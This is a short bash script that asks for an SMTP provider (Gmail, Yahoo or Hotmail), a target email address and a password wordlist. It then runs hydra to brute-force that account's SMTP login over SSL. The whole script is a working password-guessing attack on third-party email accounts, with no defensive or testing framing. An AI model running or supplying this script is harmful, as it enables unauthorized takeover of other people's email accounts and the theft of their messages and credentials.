
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
echo :Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:
echo ::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
read smtp
echo ::::::::::::::::::::
echo Enter Email Address:
echo ::::::::::::::::::::
read email
echo ::::::::::::::::::::::::::::::::::::::::::::
echo Provide Directory of Wordlist for Passwords:
echo ::::::::::::::::::::::::::::::::::::::::::::
read wordlist

hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp